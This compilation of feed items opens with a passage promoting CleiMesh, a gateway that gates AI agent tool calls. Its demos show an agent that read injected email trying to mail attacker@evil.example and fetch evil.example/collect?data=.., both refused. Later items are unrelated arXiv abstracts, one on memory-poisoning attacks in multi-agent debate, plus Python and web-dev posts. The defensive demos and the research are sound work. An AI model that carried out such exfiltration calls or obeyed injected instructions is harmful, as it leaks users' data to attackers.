agent> pay demo $2.00       -> ok. spent $4.00 of $5.00.
agent> pay demo $2.00       -> refused: over the $5.00 allowance.
agent> pay attacker $1.00   -> refused: payee not in the allowance.

# one line to install, then one command — no clone, no build:
curl -fsSL https://github.com/cleitonaugusto/cleimesh/releases/latest/download/install.sh | sh
cleimesh demo payments

2. The injected agent can't act — the Manus case

A tool that reads mail brings in outside content, so it taints the agent. Tools that act on the world are refused while the agent is tainted, until a human clears it. This is the control for the one-email takeover.

agent> send_email to team@acme.example        -> ok.
agent> read_inbox                             -> ok. (carries injected instructions)
agent> send_email to attacker@evil.example    -> refused: received untrusted content
agent> fetch_url evil.example/collect?data=.. -> refused: received untrusted content

cleimesh demo taint

3. An egress allowlist — the exfiltration case

The exfiltration step behind the Copilot flaws is a fetch to the attacker's domain. Constrain the agent's fetch tool to the hosts the human signed, and the attacker's URL — and the classic allowed-host@attacker disguise — are refused at the gateway, before the server runs.

agent> fetch_url https://api.acme.example/v1/data      -> ok.
agent> fetch_url https://evil.example/collect?data=..  -> REFUSED
agent> fetch_url https://api.acme.example@evil.example -> REFUSED

cleimesh demo egress

4. In front of a real server

None of this is a toy protocol. examples/wrap-google-workspace.sh puts CleiMesh in front of a popular Gmail MCP server: the read tools taint, the send and draft tools are clean-only. An agent that read a message can't send one until you clear it. Your Google login stays with you; CleiMesh only gates the calls.

5. And you can prove it — in a 640-byte proof

Enforcement stops the overspend. The receipt is what lets someone check, afterward, that it did. Every call — allowed or refused — lands in a signed, hash-chained receipt, and those receipts form a transparency log built on the same Merkle construction as Certificate Transparency and Sigstore. So a third party can verify that one receipt is in the signed log, and that the log only ever appended — with a 640-byte proof, in about 13 microseconds, in a log of a million receipts, without the other 999,999 and without trusting the agent or the gateway that wrote it.

cleimesh audit sth        # the signed head of the log
cleimesh audit prove 3    # a proof that receipt #3 is in it

That is the part none of the "budget for your agent" tools have: not just a limit, but a record a stranger can verify. The receipts reproduce the published test vectors of the IETF agent-action-receipts draft byte for byte — it's a format, not a silo. (Numbers and the vectors: BENCHMARKS.md.)

What this does not do

It does not fix the injection, the SSRF, or the rendering race — those live inside the model or the app. It covers the layer where the damage lands: the tool call that sends, fetches, pays, or delegates. If the harm never crosses a tool boundary CleiMesh mediates, CleiMesh doesn't see it. That honesty is the point: we don't claim to make agents un-foolable. We make being fooled cost nothing.

Install it, run cleimesh demo all, and watch each attack get refused in about ten seconds. Then put it in front of your own agent's riskiest tool.

CleiMesh is alpha and open source (MIT / Apache-2.0). It is the enforcement layer, not a promise that your model is safe. Code and demos: github.com/cleitonaugusto/cleimesh

title: Beyond Acuity Accuracy: A Multidimensional Framework for Evaluating Patient-Facing Emergency Triage AI Tools
description:
arXiv:2611.22045v1 Announce Type: new 
Abstract: Patient-facing AI triage tools may support care-seeking and emergency department prioritization, but require evaluation beyond acuity accuracy alone. We developed SAFE-Triage, a framework integrating human review, automated metrics, LLM-as-judge evaluation, and simulation testing across clinical performance, patient interaction, and clinician-facing summary quality. We applied SAFE-Triage to 40 MIMIC-IV-derived emergency vignettes and a 10,030-case acuity analysis comparing prompted LLM triage (PLT) with rule-augmented prompted LLM triage (rPLT). PLT achieved higher emergency severity index (ESI) accuracy (57.5% vs 42.8%, $P < 0.001$), lower undertriage (13.1% vs 29.8%, $P < 0.001$), and higher clinician ratings across all domains. rPLT produced shorter and more stable outputs with higher automated readability scores. SAFE-Triage identified trade-offs between acuity accuracy, undertriage risk, communication quality, readability, and summary quality, supporting pre-deployment refinement and ongoing monitoring by showing where triage tools are efficient, need improvement, or need clinician oversight.

title: MillBill: A Machining Agent with Geometric Feedback
description:
arXiv:2611.22565v1 Announce Type: new 
Abstract: Turning a CAD model into a machining program requires both process knowledge and geometric precision. Language models can generate such workflows by writing geometry and toolpath code for each part, but this makes numerical execution part of the model's task. We introduce MillBill, an agent that separates machining decisions from their geometric execution and verification. Given a boundary-representation part, stock, and material, a locally hosted, mid-sized open model proposes operations and cutting parameters for indexed three-axis machining. A geometric harness generates toolpaths, simulates material removal, and returns feedback for plan refinement. Setup planning accounts for what the available cutters can physically reach, rather than visibility alone. We evaluate the resulting programs by the fraction of the target surface area within the specified tolerance after simulated machining. With Qwen3.8-27B, MillBill outperforms frontier-model approaches that construct their own geometry and toolpath workflows on the evaluated machining tasks. Code: https://github.com/kulibinai/millbill

title: How I Built a Financial Literacy App with React, FastAPI, and PostgreSQL
description:
Tags (pick these four): react, python, webdev, beginners

Body:

I built Compound, a financial literacy app that teaches things like compound interest, investing basics, and fees through short lessons, quizzes, and calculators. Here's how it's put together and what tripped me up along the way.

What it does

• A lesson path with quizzes that explain why each answer is right
• Calculators for compound interest, DCA, FIRE number, fee impact, mortgage breakdown, inflation hedge, and portfolio building
• Completion certificates
• Family accounts

The stack

• Frontend: React + Vite + Tailwind, deployed on Vercel
• Backend: FastAPI + PostgreSQL, deployed on Railway
• Auth: JWT
• Content loading: a protected /admin/seed endpoint that loads the lessons

Three things that tripped me up

  1. "vite: command not found" on Vercel.
    My deploy failed with vite build exited with 127. Exit code 127 means "command not found." My app lives in a frontend/ folder, but Vercel was building from the top of the repo, where there's no package.json, so it never even ran npm install. The fix was one setting: Project Settings → Build and Deployment → Root Directory → frontend.

  2. Keep secrets out of the repo.
    I use .env.example files with placeholder values and keep the real values in my host's environment variables. Before sharing the code, I exported a clean copy with git archive and searched it for .env files, keys, and connection strings. It's a quick check and worth doing every time.

  3. Rotate secrets at the source.
    After my hosting provider disclosed a security incident, I replaced my keys and passwords. The lesson: changing a value in your dashboard isn't enough. Revoke the old key with whoever issued it, or it may still work.

Try it

Live demo: https://compound-frontend-seven.vercel.app

If you'd like the source code to learn from or start your own project, it's available here (one-project license): https://dmlrod.gumroad.com/l/hdcon

What would you add? I'd love to hear what other developers would build into a learning app like this.

title: DARWIN: a Geospatial Foundation Model for Marine Intelligence
description:
arXiv:2611.22496v1 Announce Type: new 
Abstract: We present DARWIN, a geospatial foundation model for marine intelligence. Recent Earth-observation foundation models have concentrated on terrestrial domains. The marine realm poses distinct challenges: missingness, multi-modal physical and biogeochemical variables, sparse labels, and dynamics that are transient, multi-scale, and non stationary over time. DARWIN adapts a masked-autoencoder backbone to these properties through missingness-aware encoding, expanded spatial and temporal masking, and Fourier-style positional embeddings, and is pretrained on 26 years of global Copernicus reanalysis together with GEBCO bathymetry.
  On predicting chlorophyll-a, the pretrained backbone attains the lowest monthly relative error in every month of 2022, outperforming both no-encoder baselines and an identically architected random-init encoder. At 10% of the supervised training data, DARWIN already surpasses the random-init model trained on 100% of the data. Embedding analysis and qualitative reconstructions show that DARWIN captures coherent oceanographic structure rather than memorising input statistics, providing a scalable backbone for downstream marine applications such as anomaly detection, species distribution modelling, and environmental monitoring.

title: Surfacing Disagreement Beats Resolving It: A Gated Ablation Study of Provenance-Weighted Memory for Multi-Agent Debate
description:
arXiv:2611.22461v1 Announce Type: cross 
Abstract: Shared memory for multi-agent debate is usually built to resolve inconsistency: retrieval returns one winning fact and the disagreement disappears before any agent sees it. We ask whether that is correct. In DebateGraph, four backends share one contract (read/write/snapshot), so five mechanisms from the agent-memory literature can be removed independently under a fixed budget, each gated on a pre-declared threshold. Across 39 runs one survives: preserving contradictions and passing the ranked conflict set to the debate, rather than collapsing it to a winner, improves F1 by +0.340 (95% CI [+0.267, +0.414]) and cuts attack success from 22 to 7 of 122 poisoned items (McNemar exact p=0.0003), at equal cost. Reaching it meant fixing a bottleneck in our harness: conflict sets are built only over retrieved edges, and our pre-declared cap left three quarters of planted contradictions unretrievable, first measuring the mechanism at +0.084. The effect replicates on two retrieval substrates and directionally on HotpotQA documents. No other mechanism survives, and two are worse than inert: once contradictions reach the prompt, a write trust-gate and the router's provenance features each cost accuracy (-0.075 and -0.096 F1). The gate fails structurally: poisoned objects are always entities the graph already contains, against 53% of gold, so groundedness scores the lie above a truthful first mention. We release the harness, attack set, and logs, and argue that silently reconciling memory is the assumption worth abandoning.

title: The path to AI FDE #17: Lists and dictionaries: holding many values
description:
Originally published on my newsletter, The Path to AI FDE. Subscribe free to get each issue by email.

This is a “From Zero” issue. Yesterday you wrapped code in functions. Today you learn to hold many values at once, instead of one variable per value.

Python has two containers you’ll use every day. A list keeps things in order, like a numbered queue. A dictionary keeps things by name, like a form with labelled boxes. Put them together, a list of dictionaries, and you get the exact shape of most data that AI tools send and receive. By the end you’ll have a small script that sums up a made-up playlist.

Part A · Lists

1. A list keeps items in order, and counts from 0. Make a list with square brackets and commas. Save this as lists.py in your sandbox folder:

fruits = ["apple", "banana", "cherry"]
print(fruits[0])
print(fruits[2])
print(fruits[-1])
print(len(fruits))

Run it with python3 lists.py (Windows: python lists.py):

apple
cherry
cherry
3

Each item has a position number called an index, and Python starts counting at 0. So fruits[0] is the first item and fruits[2] is the third. A negative index counts from the end: fruits[-1] is always the last item. len() tells you how many items there are.

Because counting starts at 0, the last index is one less than the length. Ask for fruits[3] and you get:

IndexError: list index out of range

That “one too far” slip is called an off-by-one error. It’s the most common list mistake there is.

2. Add, count, slice and sort. Lists can grow and change. Try this:

scores = [7, 3, 9]
scores.append(5)
print(scores)
print(len(scores))
print(scores[1:3])
print(scores[:2])
print(sorted(scores))
print(scores)
scores.sort(reverse=True)
print(scores)

[7, 3, 9, 5]
4
[3, 9]
[7, 3]
[3, 5, 7, 9]
[7, 3, 9, 5]
[9, 7, 5, 3]

Line by line:

  • .append(5) adds one item to the end.
  • Slicing, scores[1:3], gives a new list from index 1 up to but not including index 3. Leave out the first number and it starts at the beginning, so scores[:2] is the first two items.
  • sorted(scores) gives back a new sorted list and leaves the original alone, which is why the next line still prints [7, 3, 9, 5].
  • .sort() sorts the list itself. reverse=True (a keyword argument, from yesterday) sorts from biggest to smallest.

One trap: .sort() changes the list and returns None. So result = scores.sort() leaves result as None. If you want a sorted copy, use sorted().

Part B · Dictionaries and friends

3. A dictionary stores values under names, called keys. Use curly braces, with a key, a colon, and a value for each entry:

book = {"title": "Moon Garden", "author": "A. Rao", "year": 2019}
print(book["title"])
book["pages"] = 320
book["year"] = 2020
print(book)
print(len(book))

Moon Garden
{'title': 'Moon Garden', 'author': 'A. Rao', 'year': 2020, 'pages': 320}
4

You look a value up by its key, not by position: book["title"]. Assigning to a new key, book["pages"] = 320, adds an entry. Assigning to a key that already exists replaces its value, because each key appears only once. And the dictionary remembers the order you added the keys.

Ask for a key that isn’t there and Python stops with:

KeyError: 'rating'

A list is for “the third one”. A dictionary is for “the one called title”.

4. Read safely with .get(), and loop with .items(). When a key might be missing, use .get() instead of square brackets:

book = {"title": "Moon Garden", "author": "A. Rao", "year": 2019}
print(book.get("rating"))
print(book.get("rating", "no rating yet"))
print("year" in book)
for key, value in book.items():
    print(key, "->", value)

None
no rating yet
True
title -> Moon Garden
author -> A. Rao
year -> 2019

.get("rating") gives None for a missing key instead of crashing, and .get("rating", "no rating yet") gives the fallback you choose. in checks whether a key exists. .items() hands you each key and value as a pair, so a for loop can unpack both at once.

A simple rule: use square brackets when the key must be there (a crash tells you something is wrong), and .get() when it might be missing.

5. Tuples are fixed, and sets drop duplicates. Two more containers, each with one special trick:

point = (3, 4)
x, y = point
print(x, y)
tags = {"sci-fi", "classic", "sci-fi"}
print(len(tags))
print("classic" in tags)
print(sorted(set(["b", "a", "b", "c", "a"])))

3 4
2
True
['a', 'b', 'c']

A tuple uses round brackets. It’s like a list you can’t change after it’s made, which suits values that belong together, such as a point’s x and y. x, y = point unpacks it into two names. Try point[0] = 10 and you get TypeError: 'tuple' object does not support item assignment.

A set uses curly braces without colons. It keeps each value only once, so the repeated “sci-fi” counts once and len(tags) is 2. That makes sets great for “which different values are there?” Sets have no order, so there’s no tags[0]; use sorted() when you want to show them in order. One gotcha: {} on its own makes an empty dictionary, so an empty set is set().

6. A list of dictionaries is the shape of JSON. Put dictionaries inside a list and you can hold a whole table of records:

import json

books = [
    {"title": "Moon Garden", "year": 2019},
    {"title": "Paper Boats", "year": 2023},
]
print(books[1]["title"])
for b in books:
    print(b["title"], b["year"])
print(json.dumps(books))

Paper Boats
Moon Garden 2019
Paper Boats 2023
[{"title": "Moon Garden", "year": 2019}, {"title": "Paper Boats", "year": 2023}]

Read books[1]["title"] from left to right: position 1 in the list, then the key “title” in that dictionary. The for loop visits each record in turn.

The last line uses Python’s built-in json module (you’ll learn how import works in issue #20). json.dumps() turns the data into JSON text, the format web APIs, and the AI tools later in this series, send and receive. It looks almost the same as Python. The differences: JSON always uses double quotes, True becomes true, and None becomes null. Tomorrow you’ll read and write JSON files.

Try it (15 minutes)

  1. In your sandbox folder, create playlist.py, a made-up playlist as a list of dictionaries: 
playlist = [
    {"title": "Morning Run", "artist": "The Toys", "minutes": 4},
    {"title": "Rainy Bus", "artist": "Paper Cups", "minutes": 6},
    {"title": "Late Tea", "artist": "The Toys", "minutes": 3},
]

total = 0
titles = []
artists = set()
for song in playlist:
    total = total + song["minutes"]
    titles.append(song["title"])
    artists.add(song["artist"])

print("Songs:", len(playlist))
print("Total minutes:", total)
print(sorted(titles))
print(len(artists), "artists")
print(playlist[0].get("year", "unknown"))
  1. Run python3 playlist.py. You should see: 
Songs: 3
Total minutes: 13
['Late Tea', 'Morning Run', 'Rainy Bus']
2 artists
unknown

“The Toys” appears twice, but the set keeps it once, so there are 2 artists. None of the songs has a "year" key, so .get() gives the fallback.

  1. Change the last line to print(playlist[0]["year"]). Read the last line of the error: KeyError: 'year'. Change it back.
  2. Add print(playlist[3]). You get IndexError: list index out of range: three songs means indexes 0, 1 and 2. Remove the line.
  3. Find the longest song with a loop. Start with longest = playlist[0], then for each song, if song["minutes"] > longest["minutes"], set longest = song. Print longest["title"]. You should get Rainy Bus.

Check your understanding: (a) In ["a", "b", "c"], what’s the index of "c"? (b) What’s the difference between book["rating"] and book.get("rating") when there’s no rating? (c) What does sorted() do that .sort() doesn’t?

Answer: (a) 2, because counting starts at 0 (or -1, counting from the end). (b) Square brackets raise KeyError; .get() returns None (or the fallback you give it). (c) sorted() returns a new sorted list and leaves the original alone; .sort() changes the list itself and returns None.

Common beginner mistakes

  • Off-by-one: using len(x) as an index. The last item is x[len(x) - 1], or just x[-1].
  • Expecting a slice to include the end: x[1:3] stops before index 3.
  • KeyError from square brackets on a key that might be missing. Use .get(), or check with in first.
  • Writing x = x.sort(), which leaves x as None.
  • Writing {} for an empty set. That’s an empty dictionary; use set().

Takeaway

A list keeps items in order and counts from 0. .append(), len(), slicing and sorted() cover most of what you’ll do with one. A dictionary stores values under unique keys: square brackets when the key must exist, .get() when it might not, .items() to loop. Tuples are fixed and sets keep each value once. A list of dictionaries is the shape of JSON.

Where this fits in my roadmap: this is part of my on-ramp, the Python basics everything else sits on. Almost every AI tool I’ll call takes a list of dictionaries in and hands a dictionary back, so reading data[0]["text"] without thinking is a skill worth drilling now. Tomorrow: strings, files and JSON, so that data can come from a file and go back to one.

Over to you: think of something you track, such as books, runs or recipes. Reply with one record as a Python dictionary, like {"title": "Moon Garden", "year": 2019}.

Sources

  1. Python tutorial, “An Informal Introduction to Python”, Lists (indexing from 0, negative indexes, slicing, len(), .append()). https://docs.python.org/3/tutorial/introduction.html#lists
  2. Python tutorial, “Data Structures”, More on Lists (.append(), .sort(), list methods). https://docs.python.org/3/tutorial/datastructures.html#more-on-lists
  3. Python tutorial, “Data Structures”, Tuples and Sequences (tuples, unpacking) and Sets (duplicates removed, set() for an empty set). https://docs.python.org/3/tutorial/datastructures.html#tuples-and-sequences
  4. Python tutorial, “Data Structures”, Dictionaries (keys are unique, insertion order, in, KeyError) and Looping Techniques (.items()). https://docs.python.org/3/tutorial/datastructures.html#dictionaries
  5. Python docs, “Built-in Types”, dict.get (returns the default, or None, for a missing key). https://docs.python.org/3/builtins/stdtypes.html#dict.get
  6. Python HOWTO, “Sorting Techniques” (sorted() returns a new list; list.sort() sorts in place and returns None; reverse=True). https://docs.python.org/3/howto/sorting.html
  7. Python docs, “json” (json.dumps(), and how Python types map to JSON). https://docs.python.org/3/library/json.html
  8. Python docs, “Built-in Exceptions” (IndexError, KeyError, TypeError). https://docs.python.org/3/builtins/exceptions.html

All examples are made up (the books, songs and artists are invented) and were run with Python 3.13 on Nov 2, 2026. Error messages are from Python 3.13; other versions word some of them differently. Sources checked Nov 2, 2026.

title: What gets rebuilt in a hundred merged changes
description:
Every design system has a gap between what it offers and what gets written. You can argue about that gap in the abstract for a long time. I wanted to look at it in real code, change by change, so I took a popular open-source document-sharing product and replayed its last hundred merged changes against the components and tokens it has today.

This is what I found, how I checked it, and why the product stays anonymous.

The method

The idea is simple. Take a repository's recent history and, for each merged change, ask one question: did this change add something the codebase already had?

For each change, the check looks only at the lines that change added, not the whole file it touched. It compares them with the components and design tokens the repository declares. Two kinds of finding count.

  • Hand-built UI where a component already existed: a button element styled by hand where the codebase has Button, a pulsing grey block where it has a skeleton loader component.
  • A raw value exactly equal to a token or scale step that already existed: a pixel size that is a step on the spacing scale, a colour that is the value of a declared colour token.

One rule matters more than the rest. A finding of hand-built UI is kept only if the component already existed when the change was made. Building a button by hand before anyone had written Button is not a mistake. It is how components start.

The replay runs on a temporary copy of each commit and never touches the working repository. Nothing is uploaded, and no AI model is involved in the check itself.

What it found

Of the last hundred merged changes, all but a handful touched the product's UI source.

  • 4 of them added hand-built UI where the codebase already had the component. The most common case by far was a hand-built loading placeholder where the skeleton loader component existed. Raw buttons and inputs, and a new toggle built from scratch where a Toggle component already existed, made up the rest.
  • 9 of them wrote a raw value exactly equal to an existing token or scale step: white and near-black colours that were already tokens, pixel sizes that were already steps on the scale, z-index values that matched a declared layer.

The check also turned up values that matched nothing: widths, font sizes and radii that sat between two steps of the scale. Those are a different kind of finding. They are not a bypass, because there was no token to bypass. They are a question for the team: is this a new step, or a value that should round to an existing one?

There were contrast findings too, text colours on backgrounds below the WCAG contrast minimum. I am leaving those aside here. They are worth fixing, but they are not about reuse.

How I checked it

A count like this is only worth publishing if each finding holds up. So every finding in this note was checked by hand against the source: the line the change added, the component or token it was compared with, and whether that component existed at the time.

It is the step I will not skip. A check that names a pattern can be wrong, and the cost of a wrong claim about someone else's code is much higher than the cost of a missing one.

I have replayed other products the same way. Their notes have not yet been read by hand, so I am not quoting their numbers. What I can say is that the results varied a lot between products, which is itself useful: this is not a fixed rate of sloppiness. It depends on how visible the components are and how a team works.

Why the product is anonymous

The product is open source, the history is public, and anyone could run the same replay. I still will not name it, for three reasons.

  • These findings describe how code gets written under time pressure, by people and, more and more, by coding agents. They are not a verdict on the team, and a name invites that reading.
  • A wrong claim with a company's name on it is the real risk, to them and to me. Anonymising by default removes it.
  • If a team wants to see the full note about their own code, the right way is to offer it through their public channels, and let them decide what happens next.

So I describe the findings in plain words and never paste their code.

What it says about agents

None of these changes is labelled as written by an agent, and I make no claim that they were. What links them to agents is the shape of the mistake.

In an October benchmark of Saer, Codex hand-built UI the codebase already had a component for in 22 runs without access to the design system, and in 5 with it, out of the same number of runs on each side. The patterns were the same ones this replay found: loading placeholders, buttons, inputs and empty states built fresh beside the component that already existed.

An agent writes from what it can see. A person in a hurry does the same. As more changes are written with agents, the number of chances to rebuild something goes up, and so does the value of a check that asks the reuse question on every change.

What I take from it

  • Replay history before you argue about drift. A hundred real changes say more than any amount of opinion.
  • Judge only the lines a change adds, and only against components that existed when it was made.
  • Read every finding by hand before you publish a count.
  • Keep values that match nothing apart from values that bypass a token.
  • Describe the pattern, not the team.

The replay is part of Saer, the tool I am building to keep coding agents on the design system a codebase already has. You can request early access at saer.app.

title: I'm not a scientist, so I started an open-source dementia project for people
description:
The classic signal shows up: slow theta rhythms rise and alpha falls. Age and sex alone only reach about 59%, so the EEG is doing the work. But telling Alzheimer's from FTD is much harder: our best attempt (* a person-level model plus a second, eyes-open recording) reaches 63.3%, only a little above guessing. More people, not more features, is probably the fix. That's the open problem, and where I'd love help.

Model selection uses nested cross-validation, so the numbers aren't tuned on test people. Honest caveats: a small single-site sample, and it's a research benchmark, not a diagnostic tool.

How it works

  1. Experts (doctors, scientists) share insights through a short form, no Git needed, or join as scientific advisors.
  2. Builders pick those ideas up as issues and implement them on open data.
  3. Results go back to experts for review (needs-expert-review) before anything is presented.

Every change is reviewed, CI blocks committed data files and wording that sounds like a diagnosis, and everyone, expert or developer, is credited by name.

Where you can help

  • Finding more open dementia EEG datasets (more people is the main bottleneck)
  • Pretrained EEG foundation models for Alzheimer's vs FTD
  • Testing on a second, independent EEG dataset
  • Leading a new module: tau spread simulation, drug repurposing with knowledge graphs, or speech markers

Website: https://lordave1.github.io/openengram/
Code: https://github.com/LorDave1/openengram
Cite (Zenodo DOI): https://doi.org/10.5281/zenodo.24281637

If you work in neurology, neuroscience or ML, I'd be grateful for your critique. That's exactly what the project needs.

title: OCCAM: Improved Single-Cell Representation Learning and Perturbation Effect Prediction
description:
arXiv:2611.21959v1 Announce Type: cross 
Abstract: Predicting the effects of genetic perturbations requires models that generalize beyond observed cell contexts and gene combinations. We introduce Occam, a multilayer perceptron (MLP) framework for representation learning and perturbation-effect prediction. Occam combines cell representations learned through denoising with gene interaction, text, and protein-sequence features. It achieves the highest aggregate representation scores for perturbation information and cell-type preservation with batch integration. In cross-context few-shot prediction, a perturbation and a cell context are each observed during training, but never together. Occam better captures the measured response patterns for these unobserved combinations than four retrained competitors or direct transfer of the same perturbation's measured effects from other training cell lines. Without fine-tuning, Occam best distinguishes perturbations among the evaluated models and simple baselines in cell lines held out from predictor training, across seen and unseen assays. Predicting expression levels accurately in these settings remains challenging. For double perturbations, which target two genes simultaneously, Occam composes learned single-gene responses to better capture the combined response and reduce expression error compared with competing models and summed single-gene effects. These gains extend to both strongly additive and weakly additive responses. Together, these results support simple MLPs for cell representation learning and perturbation-effect prediction across contexts and gene combinations.
